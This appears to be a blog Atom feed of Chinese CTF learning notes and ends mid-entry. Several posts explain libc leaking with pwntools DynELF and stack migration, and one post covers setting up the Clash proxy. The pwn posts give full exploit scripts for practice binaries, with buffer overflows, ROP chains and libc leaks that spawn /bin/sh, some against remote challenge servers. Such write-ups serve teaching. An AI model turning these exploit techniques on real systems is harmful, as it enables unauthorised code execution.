      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="WP" scheme="http://chumen77.xyz/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>利用DynElf模块完成获取libc信息</title>
    <link href="http://chumen77.xyz/2020/02/15/%E5%88%A9%E7%94%A8DynElf%E6%A8%A1%E5%9D%97%E5%AE%8C%E6%88%90%E8%8E%B7%E5%8F%96libc%E4%BF%A1%E6%81%AF/"/>
    <id>http://chumen77.xyz/2020/02/15/利用DynElf模块完成获取libc信息/</id>
    <published>2020-02-15T08:54:53.000Z</published>
    <updated>2020-02-28T07:49:41.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="利用DynElf模块完成获取libc信息"><a href="#利用DynElf模块完成获取libc信息" class="headerlink" title="利用DynElf模块完成获取libc信息"></a>利用DynElf模块完成获取libc信息</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>记录一下另一种没有libc，完成漏洞利用的办法，学完后自我感觉这个办法已经比较落后了，没有libcseacher好用，也用起来比它难的多了。针对于libcseacher不能做的题，用这种办法，否则还是libcseacher好用。</p><h2 id="Dynelf"><a href="#Dynelf" class="headerlink" title="Dynelf"></a>Dynelf</h2><p>解析加载的、动态链接的ELF⼆进制⽂件中的符号。给定⼀个可以在任意地址泄漏数据的函数，任何加载的 库中的任何符号都可以被解析。（官方文档解释）</p><h3 id="基本使用框架："><a href="#基本使用框架：" class="headerlink" title="基本使用框架："></a>基本使用框架：</h3><pre><code>io = remote(ip, port)def leak(addr):    payload = &quot;xxxxxxxx&quot; + addr + &quot;xxxxxxxx&quot;    io.send(payload)    data = io.recv()    #debug用的    print(&quot;%x -&gt; %s&quot; %(addr, (data or &#39;&#39;).encode(&#39;hex&#39;)))    return data#初始化DynELF模块 d = DynELF(leak, pointer = pointer_into_ELF_file, elf = ELFObject)system_addr = d.lookup(“system”, &#39;libc&#39;)</code></pre><p>其中第2个参数，可以不传。进行的工作主要集中在leak函数的具体实现上，上面的代码只是个模板。其中，addr就是leak函数要泄漏信息的所在地址。<strong>正是这个addr的参数的存在，才让Dynelf函数在内存中到处的leak以及对比是否是我们寻找的sympols</strong>。</p><p>且由于DynELF会多次调用leak函数，这个函数必须能任意次使用，即不能泄露几 个地址之后就导致程序崩溃。由于需要泄露数据，payload中必然包含着打印函数，如write, puts, printf等。</p><h3 id="使用条件："><a href="#使用条件：" class="headerlink" title="使用条件："></a>使用条件：</h3><p>不管有没有libc文件，要想获得目标系统的system函数地址，首先都要求目标二进制程序中存在一个能够泄漏目标系统内存中libc空间内信息的漏洞。同时，由于我们是在对方内存中不断搜索地址信息，故我们需要这样的信息泄露漏洞能够被反复调用。以下是大致归纳的主要使用条件：</p><ul><li>目标程序存在可以泄露libc空间信息的漏洞，如read@got就指向libc地址空间内；</li><li>目标程序中存在的信息泄露漏洞能够反复触发，从而可以不断泄露libc地址空间内的信息。</li></ul><p>以上仅仅是实现利用的基本条件，不同的目标程序和运行环境都会有一些坑需要绕过。接下来，我们主要针对write和puts这两个普遍用来泄漏信息的函数在实际配合DynELF工作时可能遇到的问题，给出相应的解决方法。</p><h3 id="使用write函数来泄露"><a href="#使用write函数来泄露" class="headerlink" title="使用write函数来泄露"></a>使用write函数来泄露</h3><p>write函数原型是write(fd, addr, len)，即将addr作为起始地址，读取len字节的数据到文件流fd（0表示标准输入流stdin、1表示标准输出流stdout）。</p><p>其输出完全由其参数len决定，只要目标地址可读，size填多少就输出多少，不会受到诸如‘\0’, ‘\n’之类的字符影响。因此leak函数中对数据的读取和处理较为简单。但是其一个不好的地方，就是需要传递3个参数，在面对64位程序的时候，其中rdx这个寄存器是比较难处理的。就不得不用万能gadget了。</p><h4 id="万能gadget"><a href="#万能gadget" class="headerlink" title="万能gadget"></a>万能gadget</h4><p><img src="/2020/02/15/利用DynElf模块完成获取libc信息/images/15817628590359.jpg" srcset="/img/loading.gif" alt="-w817"><br>这个是libc_init函数的汇编，这个函数是一定要调用的，并且可以控制rdi,rsi,rdx,所以能称的上万能gadget。对于使用这段gadget，首先在初识函数的ret处填入如图所指的<code>pop rbx</code>的地址，然后看下栈如何来布置：<br><img src="/2020/02/15/利用DynElf模块完成获取libc信息/images/15817631112375.jpg" srcset="/img/loading.gif" alt="-w486"><br>（其中为什么填入got地址，是因为接下来ret到<code>mov rdx,r13</code>后面的call qword ptr[r12+rbx*8] 其是call这个地址的。）<br>在第一段pop 后ret地址要填入<code>mov rdx,r13</code>的地址，然后再慢慢执行，当执行完成call以后，流程还会回到这一段<br><img src="/2020/02/15/利用DynElf模块完成获取libc信息/images/15817633402017.jpg" srcset="/img/loading.gif" alt="-w259"><br>所以我们为了再次利用最后那个retn，ret到自己想去的地方，要在栈上摆好7*8=56个字节。接下来练习关于write两个题目。</p><h4 id="PlaidCTF-2013-ropasaurusrex"><a href="#PlaidCTF-2013-ropasaurusrex" class="headerlink" title="PlaidCTF 2013 ropasaurusrex"></a>PlaidCTF 2013 ropasaurusrex</h4><h5 id="查保护和arch"><a href="#查保护和arch" class="headerlink" title="查保护和arch"></a>查保护和arch</h5><pre><code>   Arch:     i386-32-little    RELRO:    No RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><h5 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h5><pre><code>ssize_t sub_80483F4(){  char buf; // [esp+10h] [ebp-88h]  return read(0, &amp;buf, 0x100u);}</code></pre><p>函数十分简单，溢出在这个位置。并且plt里面有write函数，然后就用它来泄露。</p><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code>from pwn import *io = process(&#39;./ropasaurusrex&#39;)elf = ELF(&#39;./ropasaurusrex&#39;)buf = 0x8049620padding = 140write_add = elf.symbols[&#39;write&#39;]start_addr = 0x08048340def leak(addr):    p = &#39;&#39;    p += padding * &#39;a&#39;    p += p32(write_add)    p += p32(start_addr)    p += p32(1)    p += p32(addr)    p += p32(0x4)    io.sendline(p)    content = io.recv(4)    # print(&quot;%x -&gt; %s&quot; %(addr, (content or &#39;&#39;).encode(&#39;hex&#39;)))    return contentd = DynELF(leak,elf=elf)system_add = d.lookup(&#39;system&#39;,&#39;libc&#39;)read_add = d.lookup(&#39;read&#39;,&#39;libc&#39;)log.info(&quot;system_add = %x&quot;, system_add)log.info(&quot;read_add = %x&quot;, read_add)p = padding * &#39;a&#39; + p32(read_add) + p32(system_add) + p32(0) + p32(buf) + p32(8)io.sendline(p)io.sendline(&#39;/bin/sh\x00&#39;)io.interactive()</code></pre><h4 id="Jarvis-oj-leave4"><a href="#Jarvis-oj-leave4" class="headerlink" title="Jarvis_oj_leave4"></a>Jarvis_oj_leave4</h4><h5 id="查保护和arch-1"><a href="#查保护和arch-1" class="headerlink" title="查保护和arch"></a>查保护和arch</h5><pre><code>[*] &#39;/media/psf/mypwn2/jarvis_OJ/level4/level4&#39;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><h5 id="ida分析-1"><a href="#ida分析-1" class="headerlink" title="ida分析"></a>ida分析</h5><p><img src="/2020/02/15/利用DynElf模块完成获取libc信息/images/15817716059093.jpg" srcset="/img/loading.gif" alt="-w420"></p><pre><code>ssize_t vulnerable_function(){  char buf; // [esp+0h] [ebp-88h]  return read(0, &amp;buf, 0x100u);}</code></pre><p>漏洞函数，存在栈溢出。还是跟上题一样的思路。</p><h5 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h5><pre><code>from pwn import *import time# context.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;# io = process(&#39;./level4&#39;)io = remote(&#39;pwn2.jarvisoj.com&#39;,9880)elf = ELF(&#39;./level4&#39;)__libc_start_main_got = elf.got[&#39;__libc_start_main&#39;]write_plt = elf.symbols[&#39;write&#39;]start_addr = 0x08048350padding = 140def leak(addr):    payload = padding * &#39;a&#39; + p32(write_plt) + p32(start_addr) + p32(1) + p32(addr) +p32(0x4)    io.sendline(payload)    data = io.recv(4)    print(&quot;%x -&gt; %s&quot; %(addr, (data or &#39;&#39;).encode(&#39;hex&#39;)))    return datad = DynELF(leak,elf = elf)system_addr = d.lookup(&#39;system&#39;,&#39;libc&#39;)info(&#39;system_addr = %#x&#39; %system_addr)read_addr = d.lookup(&#39;read&#39;,&#39;libc&#39;)info(&#39;read_addr = %#x&#39; %read_addr)binsh_add = 0x804A01Cpayload = padding * &#39;a&#39; + p32(read_addr) + p32(system_addr) + p32(0) + p32(binsh_add) + p32(8)io.sendline(payload)sleep(0.1)io.sendline(&#39;/bin/sh\x00&#39;)io.interactive()</code></pre><h3 id="使用puts函数来泄露"><a href="#使用puts函数来泄露" class="headerlink" title="使用puts函数来泄露"></a>使用puts函数来泄露</h3><p>printf, puts这类函数的特点是会被特殊字符影响，puts的原型是puts(addr)，即将addr作为起始地址输出字符串，直到遇到“x00”字符为止。也就是说，<strong>puts函数输出的数据长度是不受控的，只要我们输出的信息中包含x00截断符，输出就会终止，且会自动将“n”追加到输出字符串的末尾，这是puts函数的缺点</strong>，而优点就是需要的参数少，只有1个，无论在x32还是x64环境下，都容易调用。</p><h4 id="针对缺点的改进办法"><a href="#针对缺点的改进办法" class="headerlink" title="针对缺点的改进办法"></a>针对缺点的改进办法</h4><h5 id="puts输出完后就没有其他输出"><a href="#puts输出完后就没有其他输出" class="headerlink" title="puts输出完后就没有其他输出"></a>puts输出完后就没有其他输出</h5><p>leak函数模板<br>    def leak(address):<br>      count = 0<br>      content = ‘’<br>      payload = xxx<br>      p.send(payload)<br>      print p.recvuntil(‘xxxn’) #一定要在puts前释放完输出<br>      up = “”<br>      while True:<br>        c = p.recv(numb=1, timeout=0.1)<br>        count += 1<br>        if up == ‘\n’ and c == “”:  #接收到的上一个字符为回车符，而当前接收不到新字符，则<br>         content += content[:-1]  +’\x00’            #删除puts函数输出的末尾回车符<br>          break<br>        else:<br>          content += c<br>        up = c<br>      content = content[:4]  #取指定字节数<br>      log.info(“%#x =&gt; %s” % (address, (content or ‘’).encode(‘hex’)))<br>      return content<br>其中<code>c = p.recv(numb=1, timeout=0.1)</code>由于接收完标志字符串结束的回车符后，就没有其他输出了，故先等待0.1秒钟，如果确实接收不到了，就说明输出结束了。以便与不是标志字符串结束的回车符（0x0A）混淆，这也利用了recv函数的timeout参数，即当timeout结束后仍得不到输出，则直接返回空字符串””</p><h5 id="puts输出完后还有其他输出"><a href="#puts输出完后还有其他输出" class="headerlink" title="puts输出完后还有其他输出"></a>puts输出完后还有其他输出</h5><pre><code>def leak(address):  count = 0  content = &quot;&quot;  payload = xxx  p.send(payload)  print p.recvuntil(&quot;xxxn&quot;)) #一定要在puts前释放完输出  up = &quot;&quot;  while True:    c = p.recv(1)    count += 1    if up == &#39;\n&#39; and c == &quot;x&quot;:  #一定要找到泄漏信息的字符串特征      content = content[:-1] + &quot;x00&quot;                        break    else:      content += c    up = c  content = content[:4]   log.info(&quot;%#x =&gt; %s&quot; % (address, (content or &#39;&#39;).encode(&#39;hex&#39;)))  return content</code></pre><h4 id="Lctf-2016-pwn100"><a href="#Lctf-2016-pwn100" class="headerlink" title="Lctf_2016_pwn100"></a>Lctf_2016_pwn100</h4><h5 id="查保护和arch-2"><a href="#查保护和arch-2" class="headerlink" title="查保护和arch"></a>查保护和arch</h5><pre><code>[*] &#39;/media/psf/mypwn2/ichunqiu/0x05/LCTF 2016-pwn100/pwn100&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><h5 id="ida分析-2"><a href="#ida分析-2" class="headerlink" title="ida分析"></a>ida分析</h5><pre><code>int sub_40068E(){  char v1; // [rsp+0h] [rbp-40h]  sub_40063D((__int64)&amp;v1, 200);  return puts(&quot;bye~&quot;);}__int64 __fastcall sub_40063D(__int64 a1, signed int a2){  __int64 result; // rax  signed int i; // [rsp+1Ch] [rbp-4h]  for ( i = 0; ; ++i )  {    result = (unsigned int)i;    if ( i &gt;= a2 )      break;    read(0, (void *)(i + a1), 1uLL);  }  return result;}</code></pre><p>主要的漏洞函数在这两个。这二个函数结合起来引起栈溢出，第二个函数还对读入数据做了处理，我们要保证送过去200的个自己，注意要用send发。</p><ol><li>因为其有puts函数，这次就用puts函数来进行leak。等leak出来以后，返回start清理栈，再用dynelf找出system，和read函数的地址。</li><li>第二次构造rop链的时候，用read函数读<code>system(/bin/sh)</code>到一个确定的地址，还是会到start处。</li><li>第三次构造时候，直接进行调用system函数的rop链即可。</li></ol><p>其中对于read这个函数，rdx这个参数就得用万能gadget来控制了。<br><img src="/2020/02/15/利用DynElf模块完成获取libc信息/images/15817725422726.jpg" srcset="/img/loading.gif" alt="-w820"></p><h5 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h5><pre><code>#coding:utf-8from pwn import *context.arch = &#39;amd64&#39;# context.log_level = &#39;info&#39;io = process(&#39;./pwn100&#39;)elf = ELF(&#39;./pwn100&#39;)# libc = elf.libcpadding = 72puts_plt = elf.plt[&#39;puts&#39;]read_got = elf.got[&#39;read&#39;]start_add = 0x000400550pop_rdi = 0x400763def leak(addr):    payload = padding * &#39;a&#39; + p64(pop_rdi) + p64(addr) + p64(puts_plt) + p64(start_add)#flat[(pop_rdi,addr,puts_plt,start_add)]    payload = payload.ljust(200,&#39;b&#39;)    io.send(payload)    count = 0    up = &#39;&#39;    content = &#39;&#39;    io.recvuntil(&#39;bye~\n&#39;) #一定要在puts前释放完输出    while True:        c = io.recv(numb=1, timeout=0.1)        count += 1        if up == &#39;\n&#39; and c == &quot;&quot;:  #接收到的上一个字符为回车符，而当前接收不到新字符，则            content = content[:-1]  +&#39;\x00&#39;             #删除puts函数输出的末尾回车符            break            content += c        else:            up = c    content = content[:4]  #取指定字节数    log.info(&quot;%#x =&gt; %s&quot; % (addr, (content or &#39;&#39;).encode(&#39;hex&#39;)))    return contentd = DynELF(leak, elf = elf)system_addr = d.lookup(&#39;system&#39;,&#39;libc&#39;)log.info(&#39;system_addr = %#x&#39; %system_addr)binsh_addr = 0x601068 - 8payload = padding * &#39;a&#39; + flat([0x0040075A,0,1,read_got,8,binsh_addr,0,0x00400740,&#39;\x00&#39;*56,start_add])payload = payload.ljust(200,&#39;b&#39;)io.send(payload)io.recvuntil(&#39;bye~\n&#39;)io.send(&#39;/bin/sh\x00&#39;)payload = padding * &#39;a&#39; + flat([pop_rdi,binsh_addr,system_addr])payload = payload.ljust(200,&#39;b&#39;)io.send(payload)io.interactive()</code></pre><h3 id="其他获取libc的方法"><a href="#其他获取libc的方法" class="headerlink" title="其他获取libc的方法"></a>其他获取libc的方法</h3><p>虽然DynELF是一个dump利器，但是如果写不出来leak函数，下libc被墙等等。就用这两个网站：<br><a href="http://libcdb.com/" target="_blank" rel="noopener">http://libcdb.com/</a><br><a href="https://libc.blukat.me/" target="_blank" rel="noopener">https://libc.blukat.me/</a><br>都是只有有两个泄露地址，就可以查到对应的libc版本，并且可以给出其原件，接着就可以进行其他操作。</p><p>还有在比赛过程中，如果一个题目不好获取到libc，那么可以看看其他题目的libc，有可能这个赛事平台服务器都是这个版本。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;利用DynElf模块完成获取libc信息&quot;&gt;&lt;a href=&quot;#利用DynElf模块完成获取libc信息&quot; class=&quot;headerlink&quot; title=&quot;利用DynElf模块完成获取libc信息&quot;&gt;&lt;/a&gt;利用DynElf模块完成获取libc信息&lt;/h1&gt;&lt;
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="学习记录" scheme="http://chumen77.xyz/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>linux下clash的使用</title>
    <link href="http://chumen77.xyz/2020/02/14/linux%E4%B8%8Bclash%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <id>http://chumen77.xyz/2020/02/14/linux下clash的使用/</id>
    <published>2020-02-14T15:27:09.000Z</published>
    <updated>2020-02-28T07:49:58.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="linux下clash的使用"><a href="#linux下clash的使用" class="headerlink" title="linux下clash的使用"></a>linux下clash的使用</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文只是很简单记录一下，自己如何使用clash的。因为发现终端虽说在本机上已经开了代理，但是终端执行命令下载东西的时候十分的卡，今天才了解到，原来终端的代理是另外开的。所以就开始折腾一下，linux下clash的使用（本人用了很久了clash，所以直接看这个软件了）。</p><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>执行<code>cd &amp;&amp; mkdir clash</code> 在用户目录下创建 clash 文件夹。<br>下载适合的 Clash 二进制文件并解压重命名为 clash,一般个人的64位电脑下载 clash-linux-amd64.tar.gz 即可。<br>地址：<a href="https://github.com/Dreamacro/clash/releases" target="_blank" rel="noopener">https://github.com/Dreamacro/clash/releases</a></p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>在终端cd到Clash二进制文件所在的目录,把Clash 配置文件给移进去。配置文件的名称要是config.yaml<br><img src="/2020/02/14/linux下clash的使用/images/15816946080116.jpg" srcset="/img/loading.gif" alt="-w286"></p><p>我是直接创建了这个文件，并写入的自己的配置，因为mac本机一直用这个软件，然后在配置文件找到主使用那个，直接复制那个自己使用代理网站加载下来的配置给config.yaml。</p><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p><code>chmod +x ./clash</code>加执行权限<br>执行 ./clash -d . 即可启动 Clash，同时启动 HTTP 代理和 Socks5 代理。<br>然后进入这个<a href="http://clash.razord.top/" target="_blank" rel="noopener">http://clash.razord.top/</a> 链接可以对代理进行个简单管理<br><img src="/2020/02/14/linux下clash的使用/images/15816952499188.jpg" srcset="/img/loading.gif" alt="-w794"></p><h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>打开系统设置，选择网络，点击网络代理右边的 ⚙ 按钮，选择手动，填写 HTTP 和 HTTPS 代理为 127.0.0.1:7890，填写 Socks 主机为 127.0.0.1:7891，即可启用系统代理。<br><img src="file:///Volumes/data/chumenblog/source/images/15816953014396.jpg" srcset="/img/loading.gif" alt="-w409"></p><h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><p>终端开启代理<br><code>export https_proxy=http://127.0.0.1:7890 http_proxy=http://127.0.0.1:7890 all_proxy=socks5://127.0.0.1:7891</code><br>执行这个命令即可。<br><img src="file:///Volumes/data/chumenblog/source/images/15816954013538.jpg" srcset="/img/loading.gif" alt="-w495"><br>出现这个就是代理成功了，然后就会发现终端下载东西的神速。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;linux下clash的使用&quot;&gt;&lt;a href=&quot;#linux下clash的使用&quot; class=&quot;headerlink&quot; title=&quot;linux下clash的使用&quot;&gt;&lt;/a&gt;linux下clash的使用&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot;
      
    
    </summary>
    
    
      <category term="linux" scheme="http://chumen77.xyz/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>Stack Migration题目练习</title>
    <link href="http://chumen77.xyz/2020/02/11/Stack%20Migration%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A0/"/>
    <id>http://chumen77.xyz/2020/02/11/Stack Migration题目练习/</id>
    <published>2020-02-11T13:51:48.000Z</published>
    <updated>2020-02-28T07:51:31.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Stack-Migration题目练习"><a href="#Stack-Migration题目练习" class="headerlink" title="Stack Migration题目练习"></a>Stack Migration题目练习</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>记录几道Stack Migration的练习题。</p><h2 id="pwnable-simple-login"><a href="#pwnable-simple-login" class="headerlink" title="pwnable_simple_login"></a>pwnable_simple_login</h2><h3 id="查看保护和arch"><a href="#查看保护和arch" class="headerlink" title="查看保护和arch"></a>查看保护和arch</h3><pre><code class="c">    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><p>32位程序，开了nx和Canary保护。</p><h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code class="c">int __cdecl main(int argc, const char **argv, const char **envp){  int de_s; // [esp+18h] [ebp-28h]  char s; // [esp+1Eh] [ebp-22h]  unsigned int de_length; // [esp+3Ch] [ebp-4h]  memset(&amp;s, 0, 0x1Eu);  setvbuf(stdout, 0, 2, 0);  setvbuf(stdin, 0, 1, 0);  printf(&quot;Authenticate : &quot;);  _isoc99_scanf(&quot;%30s&quot;, &amp;s);  memset(&amp;input, 0, 0xCu);  de_s = 0;  de_length = Base64Decode((int)&amp;s, &amp;de_s);     // v6 = 解码后的长度  if ( de_length &gt; 0xC )  {    puts(&quot;Wrong Length&quot;);  }  else  {    memcpy(&amp;input, de_s, de_length);  // 执行完，把解码后的字段，放入input的bss内存上    if ( auth(de_length) == 1 )      correct();  }  return 0;}</code></pre><p>（其中已经改了部分变量的名称方便读代码）<br>流程就是接受一段base64编码过的字符串，然后进行一下解码，解码返回长度给变量，且做与12大小的比较，如果解码后大于12，就直接退出程序，并且解码的字符串是放在input的这个全局变量里：<br><img src="/2020/02/11/Stack Migration题目练习/images/15814303737109.jpg" srcset="/img/loading.gif" alt="-w601"><br>接着进入auth函数分析一下：</p><pre><code class="c">_BOOL4 __cdecl auth(int length){  char v2; // [esp+14h] [ebp-14h]  char *s2; // [esp+1Ch] [ebp-Ch]  int v4; // [esp+20h] [ebp-8h]  memcpy(&amp;v4, &amp;input, length);  s2 = (char *)calc_md5((int)&amp;v2, 12);  printf(&quot;hash : %s\n&quot;, s2);  return strcmp(&quot;f87cd601aa7fedca99018a8be88eda34&quot;, s2) == 0;}</code></pre><p>可以发现其是一个md5加密后，然后跟后面那串字符串对比。并且看一下v4变量：<br><img src="/2020/02/11/Stack Migration题目练习/images/15814310284289.jpg" srcset="/img/loading.gif" alt="-w407"><br>发现memcpy这个函数会引起栈溢出，但是可控的只是12-8 = 4字节。<img src="/2020/02/11/Stack Migration题目练习/images/15814313605840.jpg" srcset="/img/loading.gif" alt="-w1241"><br>然后输入12位‘1’，编码后放入程序，发现最后的4个字节被放入了ebp，正好这下就可以控制ebp了。接着就有了攻击思路：</p><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>控制好这个ebp，然后由于这个程序中，auth函数最后有一个leave ret 的gadget，main函数也有一个，正好满足我们来Stack Migration。在栈上摆放的结构为：<br><img src="/2020/02/11/Stack Migration题目练习/images/15814316930734.jpg" srcset="/img/loading.gif" alt="-w353"><br>到时候由于memcpy会复制这个老栈的前12个字节的数据，然后new esp指向的是固定位置input。然后两个leave gadget即可</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre><code>from pwn import *from base64 import *# io = process(&#39;./login&#39;)io = remote(&#39;node3.buuoj.cn&#39;,29026)system_add = 0x08049284buf = 0x0811EB40io.recvuntil(&#39;e : &#39;)p = &#39;aaaa&#39; + p32(system_add) + p32(buf)io.sendline(b64encode(p))io.interactive()</code></pre><h2 id="安恒月赛-over-over"><a href="#安恒月赛-over-over" class="headerlink" title="安恒月赛_over.over"></a>安恒月赛_over.over</h2><h3 id="查保护和arch"><a href="#查保护和arch" class="headerlink" title="查保护和arch"></a>查保护和arch</h3><pre><code>[*] &#39;/media/psf/mypwn2/ichunqiu/stack_pivot/ah_over/over.over&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><p>64位，只开了nx</p><h3 id="ida分析-1"><a href="#ida分析-1" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code>__int64 __fastcall main(__int64 a1, char **a2, char **a3){  setvbuf(stdin, 0LL, 2, 0LL);  setvbuf(stdout, 0LL, 2, 0LL);  while ( sub_400676() )    ;  return 0LL;}</code></pre><p>主函数十分简单，主要核心就在while包裹的函数:</p><pre><code>int sub_400676(){  char buf; // [rsp+0h] [rbp-50h]  memset(&amp;buf, 0, 0x50uLL);  putchar(&#39;&gt;&#39;);  read(0, &amp;buf, 0x60uLL);  return puts(&amp;buf);}</code></pre><p>可以看到溢出可控自己只有8个字节，也就是一个gadget，明显需要Stack Migration，<br>那么就得控制好ebp，padding即为0x50，但是这个题目没有给我们固定的地址，也就是没有全局变量可用，那就想办法看栈偏移了。</p><p>可以看到是read函数，和puts函数的搭配，当往里面塞0x50字节字符是不会添加上’\x00’的:<br><img src="/2020/02/11/Stack Migration题目练习/images/15814741030442.jpg" srcset="/img/loading.gif" alt="-w781"><br><img src="/2020/02/11/Stack Migration题目练习/images/15814741289950.jpg" srcset="/img/loading.gif" alt="-w649"></p><p>然后用puts函数输出时会把ebp里面的值也会输出出来。这下栈偏移是固定的，就可以在read的时候往里面塞rop链，依靠偏移来跳上去执行就可以了。<br><img src="/2020/02/11/Stack Migration题目练习/images/15814770925207.jpg" srcset="/img/loading.gif" alt="-w842"><br>算一下main的ebp与现在的esp差距是112个字节。让ebp-112就等于esp指向了栈顶esp。</p><h3 id="攻击思路-1"><a href="#攻击思路-1" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>先给程序0x50个字节，然后接收下main的ebp值。然后程序由于while循环再次，进入这个函数，这时候送rop链，第一个rop链可以先泄露下puts的内存地址，然后计算libc的地址，返回地址写成主函数start，清理下栈。然后第二次读的时候，送过去system(/bin/sh)的rop链即可。程序每次读，构造好rop链的时候，要保证送过去80字节，然后控制ebp 为栈顶esp，还有加上leave 的gadget，这下两个leave的gadget就让程序跳回栈头的下个8个字节，开始执行rop链。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;io = process(&#39;./over.over&#39;)e = ELF(&#39;./over.over&#39;)l = ELF(&#39;/lib/x86_64-linux-gnu/libc-2.23.so&#39;)leave_ret = 0x004006be pop_rdi_ret = 0x0400793put_got = e.got[&#39;puts&#39;]put_plt = e.symbols[&#39;puts&#39;]padding = 80raw_input(&#39;-&gt;&#39;)io.sendafter(&quot;&gt;&quot;, &#39;a&#39; * 80)# stack = u64(io.recvuntil(&quot;\x7f&quot;)[-6: ].ljust(8, &#39;\0&#39;)) - 0x70stack = u64((io.recvline())[80:86].ljust(8,&#39;\x00&#39;)) - 0x70io.readuntil(&#39;&gt;&#39;)print(hex(stack))p = flat([&#39;11111111&#39;,pop_rdi_ret,put_got,put_plt,0x000400580,(80-40)*&#39;1&#39;,stack,leave_ret])raw_input(&#39;-&gt;&#39;)io.send(p)libc = u64(io.recvuntil(&quot;\x7f&quot;)[-6: ].ljust(8, &#39;\0&#39;)) - l.symbols[&#39;puts&#39;]print(hex(libc))io.sendafter(&quot;&gt;&quot;, &#39;a&#39; * 80)stack = u64((io.recvline())[80:86].ljust(8,&#39;\x00&#39;)) - 0x70print(hex(stack))io.readuntil(&#39;&gt;&#39;)system_add = libc + l.symbols[&#39;system&#39;]binsh_add = libc + l.search(&#39;/bin/sh\x00&#39;).next()p = flat([&#39;22222222&#39;,pop_rdi_ret,binsh_add,system_add,(80-4*8)*&#39;2&#39;,stack,leave_ret])io.send(p)io.interactive()</code></pre><h2 id="HITCON-training-lab6"><a href="#HITCON-training-lab6" class="headerlink" title="HITCON_training_lab6"></a>HITCON_training_lab6</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><pre><code class="c">#include &lt;stdio.h&gt;int count = 1337 ;char *t= &quot;Z\xc3&quot; ;int main(){if( count!=1337 ){    _exit(1);}count++ ;char buf[48];setvbuf(stdout,0,2,0);puts(&quot;Try your best : &quot; );read(0, buf,128);return ;}</code></pre><p><code>gcc -m32 -z relro -z now -fno-stack-protector -mpreferred-stack-boundary=2 migration.c -o migration</code> 编译命令。<br>然后就不分析了，前面练习64位时候写的那个博客已经记录很清楚了，这里只记录下exp。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre><code>from pwn import *context.arch = &#39;i386&#39;context.log_level = &#39;debug&#39;# io = process(&#39;./migration&#39;)io = remote(&#39;127.0.0.1&#39;,4000)e = ELF(&#39;./migration&#39;)l = ELF(&#39;/lib/i386-linux-gnu/libc-2.23.so&#39;)padding = 40puts_plt = e.symbols[&#39;puts&#39;]puts_got = e.got[&#39;puts&#39;]read = e.symbols[&#39;read&#39;]leave_ret = 0x08048418buf1 = 0x0804b000 - 0x100buf2 = buf1 - 0x50pop_edx_ret = 0x0804836dp = &#39;a&#39; * padding + flat([buf1,read,leave_ret,0,buf1,0x50])io.readuntil(&#39;:\n&#39;)io.send(p)p = flat([buf2,puts_plt,pop_edx_ret,puts_got,read,leave_ret,0,buf2,0x50])sleep(0.1)raw_input(&#39;-&gt;&#39;)io.sendline(p)puts_add = u32(io.recv(4))libc = puts_add - l.symbols[&#39;puts&#39;]print(hex(libc))system_add = l.symbols[&#39;system&#39;] + libcbinsh_add = l.search(&#39;/bin/sh\x00&#39;).next() + libcp = flat([buf1,system_add,system_add,binsh_add])raw_input(&#39;-&gt;&#39;)# sleep(0.1)io.sendline(p)io.interactive()</code></pre><h2 id="spwn"><a href="#spwn" class="headerlink" title="spwn"></a>spwn</h2><h3 id="查保护和arch-1"><a href="#查保护和arch-1" class="headerlink" 